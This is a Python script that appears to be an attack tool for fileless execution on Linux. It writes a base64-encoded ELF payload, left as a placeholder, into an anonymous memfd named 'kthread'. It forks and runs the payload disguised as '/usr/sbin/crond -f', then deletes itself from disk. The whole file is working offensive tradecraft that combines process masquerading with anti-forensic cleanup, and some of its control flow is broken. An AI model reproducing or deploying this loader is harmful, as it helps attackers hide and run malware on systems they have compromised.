#!/usr/bin/python
import os, sys, ctypes, base64

def check_command_existence(cmd):
    """
    Verifies that a given command exists on the machine.
    :param cmd: The command whose existence we want to check.
    :return: True if the command is present on the system, False otherwise.
    """
    output = os.system("command -v %s >/dev/null" % cmd)
    if int(output) == 0:
        return 0
    else:
        return 1

def assert_memfd_py3():
    result = os.system("python3 -c \"import ctypes;print(ctypes.CDLL(None).syscall(319, '', 0))\"")
    if int(result) == -1:
        raise RuntimeError("[!] The remote kernel doesn't support the create_memfd syscall!")
        sys.exit(1)


def assert_memfd_py():
    result = os.system("python -c \"import ctypes;print(ctypes.CDLL(None).syscall(319, '', 0))\"")
    if int(result) == -1:
        raise RuntimeError("[!] The remote kernel doesn't support the create_memfd syscall!")
        sys.exit(1)


def assert_memfd_py27():
    result = os.system("python2.7 -c \"import ctypes;print(ctypes.CDLL(None).syscall(319, '', 0))\"")
    if int(result) == -1:
        raise RuntimeError("[!] The remote kernel doesn't support the create_memfd syscall!")
        sys.exit(1)



def self_delete():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print(f"[+] Script '{script_path}' has been self-deleted.")
    except Exception as e:
        print(f"[!] Error during self-deletion: {e}")


def load():

    p = 'base64 -w0 an .elf file here'

    fd = ctypes.CDLL(None).syscall(319, "kthread", 0)
    os.write(fd, base64.b64decode(p))
    arguments = ['/usr/sbin/crond -f']
    try:
        pid = os.fork()
        if pid > 0:
            print("[+] Child process PID --> %i" % pid)
        else:
            print("[+] /proc/self/fd/%i -->" %fd, arguments)
            os.execv("/proc/self/fd/%i" % fd, arguments)
    except Exception as e:
        print("[!] Execution failed (%s)!" % str(e))


if __name__ == '__main__':

    if check_command_existence("python3") == 0:
        print("[+] Python3 detecting...proceeding")
        assert_memfd_py3()
        load()
        self_delete()
        sys.exit(2)
    else: 
        raise RuntimeError("[!] Python3 is not present on the machine!")

    if check_command_existence("python2.7") == 0:
        print("[+] Python2.7 detected...proceeding")
        assert_memfd_py27()
        load()
        self_delete()
        sys.exit(3)
    else:
        raise RuntimeError("[!] Python2.7 is not present on the machine!")

    if check_command_existence("python") == 0:
        print("[+] Python detected...proceeding")
        assert_memfd_py()
        load()
        self_delete()
        sys.exit(4)
    else:
        raise RuntimeError("[!] Python is not present on the machine!")
